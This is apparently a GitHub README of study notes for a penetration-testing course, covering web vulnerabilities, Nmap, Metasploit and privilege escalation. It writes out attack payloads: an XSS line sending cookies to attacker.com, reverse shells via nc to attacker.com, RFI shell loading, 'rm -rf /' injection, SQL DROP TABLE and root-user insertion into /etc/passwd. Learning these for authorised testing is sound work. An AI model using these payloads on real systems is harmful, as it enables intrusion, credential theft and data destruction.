# 🔴 Jr Penetration Tester Path — Professional Curriculum

![Path Status](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red?style=for-the-badge&logo=tryhackme)
![Completion](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Level](https://img.shields.io/badge/Level-Intermediate-orange?style=for-the-badge)
![Last Updated](https://img.shields.io/badge/Updated-June%202026-blue?style=for-the-badge)

> **Comprehensive penetration testing curriculum** — Professional methodology for conducting end-to-end engagements.  
> This path covers the **complete attack lifecycle** from reconnaissance to post-exploitation and reporting.

---

## 📚 Learning Path Overview

This path is divided into **7 major modules**, each building upon previous knowledge:

| Module | Status | Key Topics |
|--------|--------|-----------|
| 🔍 Pentesting Fundamentals | ✅ Completed | Methodology, Ethics, Engagement Types, ROE |
| 🌐 Introduction to Web Hacking | ✅ Completed | IDOR, File Inclusion, SSRF, XSS, SQLi, Command Injection |
| 🛠️ Burp Suite | ✅ Completed | Proxy, Repeater, Intruder, Decoder, Comparer |
| 🌍 Network Security | ✅ Completed | Passive Recon, Active Scanning, Nmap, Protocols |
| 🔐 Vulnerability Research | ✅ Completed | CVE, Exploit-DB, Manual Research, Proof-of-Concept |
| 💻 Metasploit Framework | ✅ Completed | Modules, Payloads, Sessions, Post-Exploitation |
| 🚩 Privilege Escalation | ✅ Completed | Linux & Windows PrivEsc Techniques |

---

## 🔍 Module 1: Pentesting Fundamentals

### Engagement Types

| Type | Scope | Visibility | Timing |
|------|-------|-----------|--------|
| **White Box** | Full | Complete knowledge | Slow, thorough |
| **Grey Box** | Partial | Some knowledge | Medium speed |
| **Black Box** | Limited | No knowledge | Realistic, fast-paced |

### Penetration Testing Lifecycle

```
┌──────────────────────────────────────────────────┐
│ 1. SCOPING & RULES OF ENGAGEMENT (ROE)          │
│    • Written authorization required              │
│    • Define scope, objectives, timeline          │
│    • Identify protected systems & data           │
└──────────────────────────────────────────────────┘
                        ↓
┌──────────────────────────────────────────────────┐
│ 2. PASSIVE RECONNAISSANCE                        │
│    • OSINT (Open-Source Intelligence)            │
│    • WHOIS lookups, DNS enumeration              │
│    • No direct interaction with target           │
└──────────────────────────────────────────────────┘
                        ↓
┌──────────────────────────────────────────────────┐
│ 3. ACTIVE SCANNING                               │
│    • Nmap port scans, version detection          │
│    • Service enumeration                         │
│    • Vulnerability scanning                      │
└──────────────────────────────────────────────────┘
                        ↓
┌──────────────────────────────────────────────────┐
│ 4. EXPLOITATION                                  │
│    • Gain initial access                         │
│    • Establish foothold                          │
│    • Execute proof-of-concept                    │
└──────────────────────────────────────────────────┘
                        ↓
┌──────────────────────────────────────────────────┐
│ 5. POST-EXPLOITATION                             │
│    • Privilege escalation                        │
│    • Credential harvesting                       │
│    • Lateral movement                            │
│    • Persistence mechanisms                      │
└──────────────────────────────────────────���───────┘
                        ↓
┌──────────────────────────────────────────────────┐
│ 6. REPORTING & REMEDIATION                       │
│    • Professional findings documentation         │
│    • Risk ratings & impact analysis              │
│    • Remediation recommendations                 │
│    • Executive summary                           │
└──────────────────────────────────────────────────┘
```

### Key Legal Frameworks

- ✅ Written authorization from system owner
- ✅ Scope clearly defined in engagement letter
- ✅ Rules of Engagement (ROE) agreed upon
- ✅ No access to other systems outside scope
- ✅ Incident response procedures documented
- ✅ Data handling & confidentiality agreements

---

## 🌐 Module 2: Introduction to Web Hacking

### OWASP Top 10 Vulnerabilities

#### 1️⃣ Broken Authentication
```bash
# Test for default credentials
admin:admin
admin:password
root:root

# Test for weak session handling
# Check cookie properties (secure, httponly, samesite)
```

#### 2️⃣ Insecure Direct Object Reference (IDOR)
```bash
# Manipulate object IDs in requests
GET /profile?id=100           # Your profile
GET /profile?id=101           # Admin profile (unauthorized)

# Test with different user IDs
for i in {1..100}; do
  curl http://target.com/api/user/$i
done
```

#### 3️⃣ SQL Injection (SQLi)
```bash
# Test payloads
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
'; DROP TABLE users;--
1' AND SLEEP(5)--

# Detection: Time-based blind SQLi
# Exploitation: Extract database contents
# Tools: sqlmap, Burp Suite
```

#### 4️⃣ Cross-Site Scripting (XSS)

**Reflected XSS:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Stored XSS:**
```html
<!-- Injected into database, executes on page load -->
Comment: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

**DOM-based XSS:**
```javascript
// Vulnerable: User input directly into DOM
document.getElementById('output').innerHTML = userInput;

// Secure: Use textContent instead
document.getElementById('output').textContent = userInput;
```

#### 5️⃣ Broken Access Control
```bash
# Test horizontal privilege escalation
GET /admin/dashboard       # As regular user
GET /reports/finance       # Access other user's data

# Test vertical privilege escalation
# Try to access admin functions with user account
```

#### 6️⃣ Security Misconfiguration
```bash
# Check for exposed configs
/.git/config
/web.config
/config.php
/.env
/aws.json

# Test HTTP methods
curl -X PUT /file.txt
curl -X DELETE /admin
curl -X TRACE /
```

#### 7️⃣ File Inclusion Vulnerabilities

**Local File Inclusion (LFI):**
```bash
# Basic LFI
?page=../../../../etc/passwd

# With null byte (PHP < 5.3.4)
?page=../../../../etc/passwd%00

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=../config.php
?page=data:text/plain,<?php phpinfo(); ?>
```

**Remote File Inclusion (RFI):**
```bash
# RFI attack
?page=http://attacker.com/shell.php

# Log poisoning via RFI
?page=http://attacker.com/<?php system($_GET['cmd']); ?>
```

#### 8️⃣ Server-Side Request Forgery (SSRF)
```bash
# SSRF to access internal resources
?url=http://localhost/admin
?url=http://169.254.169.254/latest/meta-data/    # AWS metadata

# SSRF to port scan internal network
?url=http://192.168.1.1:8080
?url=http://10.0.0.1:3306
```

#### 9️⃣ Command Injection
```bash
# Test payloads
; whoami
| whoami
|| whoami
&& whoami
`whoami`
$(whoami)
| nc attacker.com 4444

# Examples
?cmd=ls; cat /etc/passwd
?filename=test.txt; rm -rf /
```

#### 🔟 Sensitive Data Exposure
```bash
# Check for unencrypted communications
# Look for sensitive data in responses
# Check for hardcoded credentials
# Review API responses for PII
```

---

## 🛠️ Module 3: Burp Suite Mastery

### Core Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| **Proxy** | Intercept & inspect HTTP(S) traffic | MITM all requests, identify injection points |
| **Repeater** | Manually craft & resend requests | Test authentication, payloads, edge cases |
| **Intruder** | Automate repetitive attacks | Brute-force, fuzzing, parameter enumeration |
| **Scanner** | Automated vulnerability detection | Web app scanning, automated testing |
| **Decoder** | Encode/decode data | Base64, URL, HTML, Hex encoding |
| **Comparer** | Diff two requests/responses | Identify differences, bypass detection |
| **Collaborator** | Out-of-band data exfiltration | SSRF exfiltration, XXE data retrieval |

### Burp Suite Workflow

```
1. Configure Proxy
   └─ Set Burp as browser proxy (127.0.0.1:8080)
   
2. Intercept & Analyze
   └─ Capture all requests, identify parameters
   
3. Send to Repeater
   └─ Test payloads, modify headers
   
4. Send to Intruder
   └─ Automate attacks (brute force, fuzzing)
   
5. Use Decoder
   └─ Encode/decode payloads
   
6. Analyze Results
   └─ Identify vulnerabilities, generate report
```

### Practical Techniques

**SQL Injection Testing in Repeater:**
```
1. Intercept login request
2. Send to Repeater
3. Modify: username: admin' OR '1'='1
4. Observe: Authentication bypass
```

**Brute Force with Intruder:**
```
1. Identify login form
2. Set username: admin (constant)
3. Set password: PAYLOAD (variable)
4. Load rockyou.txt as payload list
5. Start attack, monitor for successful response
```

---

## 🌍 Module 4: Network Security

### Passive Reconnaissance

```bash
# Domain Information
whois example.com              # Registrant details, nameservers
nslookup example.com           # DNS A records
dig example.com                # Detailed DNS records
dig example.com MX             # Mail server records
dig example.com NS             # Nameserver records

# OSINT Tools
theHarvester -d example.com -b google    # Email harvesting
Shodan search (IP address)     # Public IP information
Google Dorking: site:example.com inurl:admin

# Historical Data
Wayback Machine                # Archived versions of website
DNS history (DNSdumpster)      # Past DNS records
WHOIS historical data          # Previous registrants
```

### Active Reconnaissance — Nmap

**Port Scanning Levels:**

```bash
# 1. Ping Sweep (Host Discovery)
nmap -sn 192.168.1.0/24        # Identify live hosts

# 2. TCP SYN Scan (Stealth Scan)
nmap -sS -p 1-1000 target      # Fast, reliable

# 3. Version Detection
nmap -sV target                # Identify service versions
nmap -sC target                # Run default NSE scripts

# 4. Aggressive Scan
nmap -A target                 # OS detection + version + scripts

# 5. Full Port Scan
nmap -p- target                # All 65535 ports

# 6. Vulnerability Scanning
nmap --script vuln target      # Check for known vulnerabilities
nmap --script smb-os-discovery -p 445 target
nmap --script ssl-enum-ciphers -p 443 target

# 7. Saving Results
nmap -A target -oN nmap.txt    # Normal format
nmap -A target -oX nmap.xml    # XML format
nmap -A target -oG nmap.grep   # Grepable format
```

**Common Ports Reference:**

| Port | Service | Protocol |
|------|---------|----------|
| 21 | FTP | File Transfer |
| 22 | SSH | Secure Shell |
| 23 | Telnet | Terminal |
| 25 | SMTP | Email |
| 53 | DNS | Domain Name System |
| 80 | HTTP | Web |
| 110 | POP3 | Email |
| 143 | IMAP | Email |
| 443 | HTTPS | Web (Encrypted) |
| 445 | SMB | File Sharing (Windows) |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote Desktop |
| 5432 | PostgreSQL | Database |
| 5985 | WinRM | Windows Remote Management |
| 8080 | HTTP Proxy | Web Proxy |

---

## 🔐 Module 5: Vulnerability Research

### CVE Discovery & Exploitation

```bash
# Search CVE database
searchsploit "Apache 2.4.x"
searchsploit -w WordPress 5.0

# Copy exploit locally
searchsploit -m 47000           # Copy exploit ID 47000

# Verify CVE details
# Visit: https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXXX
```

### Exploit Modification

```bash
# Common exploit modifications:
1. Change target IP address
2. Update payload (reverse shell)
3. Modify port numbers
4. Adjust command execution syntax
5. Add error handling

# Test POC in isolated environment first
# Verify all parameters before execution
```

### Public Vulnerability Databases

- **NVD** (National Vulnerability Database) — nvd.nist.gov
- **Exploit-DB** — exploit-db.com
- **GitHub** — Search for public exploits
- **Security Blogs** — Vendor advisories, researcher writeups
- **Vendor Sites** — Official security bulletins

---

## 💻 Module 6: Metasploit Framework

### Framework Architecture

```
┌────────────────────────────────────┐
│ msfconsole (Main Interface)         │
├────────────────────────────────────┤
│ Modules:                            │
│ • Exploits      (Gain Access)       │
│ • Payloads      (Code Execution)    │
│ • Encoders      (Obfuscation)       │
│ • Evasion       (AV Bypass)         │
│ • Post-Modules  (After Exploitation)│
│ • Auxiliary     (Scanning, etc.)    │
└────────────────────────────────────┘
```

### Typical Workflow

```bash
# 1. Start Metasploit
msfconsole

# 2. Search for module
search apache 2.4
search type:exploit platform:windows

# 3. Use module
use exploit/apache/name

# 4. View options
show options

# 5. Configure options
set RHOST 192.168.1.100
set RPORT 80
set LHOST 192.168.1.50
set LPORT 4444

# 6. Select payload
set PAYLOAD windows/meterpreter/reverse_tcp

# 7. Execute
exploit -j                  # Run as background job
```

### Post-Exploitation

```bash
# After successful exploitation:
sessions -l                 # List active sessions
sessions -i 1              # Interact with session 1

# Meterpreter commands
getuid                     # Get current user
sysinfo                    # System information
ipconfig                   # Network configuration
getpwd                     # Current working directory
ls / dir                   # List files
download /etc/passwd       # Download file
upload backdoor.exe        # Upload file
hashdump                   # Extract hashes (Windows)
```

---

## 🚩 Module 7: Privilege Escalation

### Linux Privilege Escalation

#### 1. SUID Binary Exploitation

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check against GTFOBins
# Example: find runs with SUID bit set
find / -name flag.txt      # Runs as root
```

#### 2. Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Example vulnerable config
# User can run: /usr/bin/python as sudo

# Exploitation
sudo python -c "import os; os.system('/bin/bash')"
```

#### 3. Cron Job Abuse

```bash
# Find cron jobs
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*

# Example: Script runs every minute as root
*/1 * * * * /home/user/update.sh

# If /home/user/update.sh is writable:
echo "nc attacker.com 4444 -e /bin/bash" > /home/user/update.sh
# Wait for next cron execution
```

#### 4. Weak File Permissions

```bash
# Check writable files
find / -writable 2>/dev/null

# Example: /etc/passwd is world-writable
echo "newuser::0:0:::/bin/bash" >> /etc/passwd
su newuser
```

#### 5. Environmental Variables & PATH Hijacking

```bash
# Check environment
env
echo $PATH

# If script uses relative path:
# Original script: gcc file.c
# Create malicious gcc in PATH
# When executed, uses your gcc instead
```

#### 6. Kernel Exploits

```bash
# Get kernel version
uname -a

# Check for known vulnerabilities
searchsploit "Linux Kernel 4.4.0"

# Example: CVE-2019-14287 (sudo vulnerability)
sudo -u#-1 /bin/bash        # Exploits sudo with -1 UID
```

### Windows Privilege Escalation

#### 1. SeImpersonatePrivilege

```powershell
# Check privileges
whoami /priv

# If SeImpersonatePrivilege is present:
# Use Potato exploit (RoguePotato, JuicyPotato, etc.)
./JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
```

#### 2. Unquoted Service Paths

```powershell
# Find services with unquoted paths
wmic service list brief

# Example: C:\Program Files\App\Service.exe
# Tries to execute: C:\Program.exe
# If writable, place malicious Program.exe
```

#### 3. Weak Registry Permissions

```powershell
# Check registry permissions
reg query HKLM\Software\Microsoft\Windows

# If writable, modify to add new admin user
```

#### 4. Stored Credentials

```powershell
# Check credential manager
cmdkey /list

# Use credentials in privileged operation
runas /savecred /user:ADMIN cmd.exe
```

---

## 🎓 Practical Exercises

### Exercise 1: Web Application Testing
- Set up DVWA (Damn Vulnerable Web Application)
- Test each vulnerability category
- Document findings professionally
- Create mitigation recommendations

### Exercise 2: Network Penetration Test
- Scan network
- Identify services
- Research vulnerabilities
- Exploit systematically
- Write comprehensive report

### Exercise 3: Privilege Escalation Lab
- Deploy vulnerable Linux/Windows instances
- Identify escalation vectors
- Execute exploits
- Document complete attack chain

---

## 📚 Additional Resources

### Online Platforms
- ✅ TryHackMe — Guided labs (this curriculum)
- ✅ HackTheBox — Self-paced challenges
- ✅ PentesterLab — Practical penetration testing exercises

### Books
- "Web Application Hackers Handbook" — Web security fundamentals
- "The Art of Exploitation" — System-level exploitation
- "Penetration Testing" — Professional methodology

### Tools Documentation
- [Burp Suite Academy](https://portswigger.net/web-security)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [NMAP Documentation](https://nmap.org/docs.html)

---

## 🎯 Key Takeaways

> **This path is not about memorizing tools — it's about understanding the fundamentals deeply.**

Key principles:
- ✅ **Methodology matters** — Systematic approach beats random clicking
- ✅ **Understand the why** — Know why a vulnerability exists before exploiting it
- ✅ **Document everything** — Professional reporting is essential
- ✅ **Ethics first** — Authorization before any testing
- ✅ **Continuous learning** — New vulnerabilities emerge constantly

---

## 🔗 Connect

[![TryHackMe](https://img.shields.io/badge/TryHackMe-NEPHOS-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/p/NEPHOS)
[![GitHub](https://img.shields.io/badge/GitHub-obadahamed-181717?style=for-the-badge&logo=github)](https://github.com/obadahamed)

---

**Completion Date:** June 2026  
**Author:** Obada Hamed (NEPHOS)  
**Status:** ✅ Path Completed

*This comprehensive curriculum is the foundation for a successful career in penetration testing and ethical hacking.*
